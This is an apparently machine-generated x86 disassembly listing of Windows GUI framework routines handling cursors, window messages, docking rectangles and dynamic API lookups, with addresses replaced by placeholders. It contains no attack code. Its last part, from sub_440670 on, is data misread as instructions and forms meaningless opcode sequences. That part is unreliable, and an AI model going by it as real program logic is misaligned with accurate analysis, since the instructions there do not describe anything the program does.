lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434554
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_43f4dc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43d18c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_43d238
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_43d7e0
test eax eax
je r-xdata
mov eax esi
call sub_43d204
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f284
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_43dab0
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_43d7e0
mov edx [ ebx + 0x20 ]
call sub_43d738
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_43f4dc
pop ecx
sub_43f55c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43d1e8
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_43d1e8
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_43d7e0
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_43f55c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_43f284
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_43dab0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_43d3e4
mov eax edi
call sub_43d7d4
test eax eax
je r-xdata
mov eax edi
call sub_43d7e0
mov esi eax
mov eax esi
call sub_43d6fc
push eax
mov eax esi
call sub_43d238
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_43d7d4
call sub_43d6fc
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_43d6fc
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_43d724
mov eax esi
call sub_43d6fc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43d724
mov eax edi
call sub_43d7e0
call sub_43d774
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_43d238
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_43d724
mov eax edi
call sub_43d7d4
call sub_43d774
mov bl 0x1
jmp r-xdata
sub_43f694
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43da48
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_41245c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43e23c
test eax eax
je r-xdata
push ebp
call sub_43f4dc
pop ecx
push ebp
call sub_43f55c
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_43f460
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_43f71c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_43d2c8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_43d2c8
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f410
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_43f410
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_43f7ac
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fb84
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43e23c
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f1e0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e23c
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4346f8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fb8b
lea eax [ ebp - 0x48 ]
call sub_403e78
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b390
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_433414
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_4358a8
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403e78
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_43f694
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_439ec0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_43f294
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_406878
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_43f71c
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43f294
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406878
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e23c
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_434ad4
jmp r-xdata
mov eax edi
call sub_451e00
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43e23c
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_434554
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_434bb4
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ecc
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43f180
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43b390
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_435250
jmp r-xdata
sub_43fb94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_43fd08
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_43fc24
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fce0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_43fc88
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_43fcb8
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406964
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_43fce0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43fc54
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_43fd08
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_43fc6c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_43fc88
pop ebx
retn
mov eax ebx
call sub_43fcb8
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_43fd6c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43fed2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_43fff0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_43ffd4
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_43ffd4
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4400e0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403128
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403128
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403128
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e78
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403e78
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_440168
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4402e0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408a84
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403ecc
mov eax [ rw-data ]
call sub_404338
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a84
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ecc
mov eax [ rw-data ]
call sub_404338
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404338
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_413acc
mov [ rw-data ] eax
call sub_43fd6c
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fb94
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_452ddc
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_453ec0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_455aa8
mov ecx r-xdata
mov edx sub_431c70
mov eax [ r-xdata ]
call sub_413280
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4402e7
lea eax [ ebp - 0x10 ]
call sub_403e78
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_440332
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440393
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44039a
retn
mov eax rw-data
call sub_40cc70
call sub_4400e0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_4048f4
mov eax rw-data
call sub_403e78
mov eax rw-data
call sub_403e78
sub_44039c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440422
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440429
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_440168
mov eax [ r-xdata ]
call sub_4130f4
mov eax [ r-xdata ]
call sub_413194
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413140
sub_440670
stc
push ebx
push eax
[ esi + ecx ]
inc esp
add [ esi + ecx + 0x44 ] ah
add [ eax + 0x10 ] ch
inc esp
add [ eax + 0x11004410 ] cl
push esp
inc ebx
jne r-xdata
inc eax
add [ eax + 0x33 ] bh
je r-xdata
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
inc esp
add [ eax + 0xb00440e ] dh
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
test [ ebx ] dh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
push eax
add eax r--data
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cwde
push es
inc esp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x1b340006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
add al dh
push cs
inc esp
add al dl
xchg esi eax
inc ecx
add al cl
xchg edi eax
inc ecx
add al bh
cdq
inc ecx
add al ah
xchg esi eax
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add ah cl
or eax 0x3f580044
inc ecx
add al ch
xchg ebp eax
inc ecx
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
and [ edx ] 0x41
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x7100000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx ] dh
inc esp
add [ eax ] dh
add [ eax ] al
add [ ecx + ebx + 0x41 ] ch
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
arpl [ ebp + 0x74 ] si
int3
loopne r-xdata
add eax 0x580044
add bh bh
test al 0x10
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
int3
push ebx
inc ecx
add [ esp + edx * 2 + 0x41 ] al
add [ ecx * 2 + 0x54800041 ] dh
inc ecx
add ah dh
push esp
inc ecx
add [ eax + 0x24004418 ] bh
dec edi
inc ecx
add al dl
inc ecx
inc ecx
add al al
dec edi
inc ecx
add [ eax ] al
push eax
inc ecx
add [ eax + edx * 2 + 0x41 ] ch
add [ eax ] ah
inc esi
inc ecx
add ah bh
push ecx
inc ecx
add [ eax ] ch
dec eax
inc ecx
add ah bh
dec eax
inc ecx
add [ eax ] bh
push edx
inc ecx
add [ eax + 0x52 ] cl
inc ecx
add [ eax + 0x49 ] ah
inc ecx
add [ ecx + ecx * 2 + 0x4a600041 ] dh
inc ecx
add al bh
dec ebx
inc ecx
add [ eax + 0x4c ] dl
inc ecx
add ah ah
dec esp
inc ecx
add [ eax - 0x5bffbeb1 ] cl
dec edi
inc ecx
add [ edx + edx * 2 + 0x50ec0041 ] bl
inc ecx
add [ esp + edx * 2 + 0x54bc0041 ] ch
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi + ecx * 2 + 0x3f580041 ] bh
inc ecx
add [ eax - 0x77ffbebd ] dl
inc edx
inc ecx
add [ ecx + edx * 2 + 0x41 ] ah
add [ eax - 0x63ffbeaf ] bl
push ecx
inc ecx
add [ eax + 0x74004151 ] ah
inc esi
inc ecx
add [ ebx + edx * 2 ] dl
inc ecx
add [ eax + 0x53 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7 ] cl
inc esp
add [ eax ] ch
add [ eax ] al
call 0xffffffffe0444af6
cdq
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ ebx + edx * 4 ] dh
inc ecx
add [ ebx + esi + 0x33780040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
pop es
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0xd600041 0x44
je r-xdata
add ah bl
xor [ eax ] al
xchg esp eax
adc al [ eax + eax - 0x1c ]
adc al [ eax + eax - 0x18 ]
inc ebx
jne r-xdata
add [ eax ] al
add al [ eax ]
out dx al
xchg ebp eax
inc ecx
add [ esi + edi + 0x41 ] dh
add al al
xchg esi eax
inc ecx
inc eax
add [ edx + edx + 0x12e40044 ] dl
inc esp
add al ch
dec esp
imul esi [ ebx + 0x74 ] 0x948c08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ ebx + ecx + 0x17b00044 ] dh
inc esp
add al bh
rcl [ esi - 0x63e3ffbf ] 0x41
inc ebx
jne r-xdata
add [ esp + ebx * 4 ] bl
inc ecx
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop esp
sbb al [ ecx ]
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
cdq
inc ecx
add al ah
xchg esi eax
inc ecx
add al bl
xchg esi eax
inc ecx
add [ eax ] al
0x12400041 0x44
fcomp [ ecx + eax * 2 + 0x419c8000 ]
add [ esp + ebx * 4 ] dl
inc ecx
add [ esp + ebx * 4 + 0x41 ] al
add [ eax ] bl
pushfd
inc ecx
add [ eax ] cl
or eax 0x15d80044
inc esp
add [ eax + 0x15 ] dh
inc esp
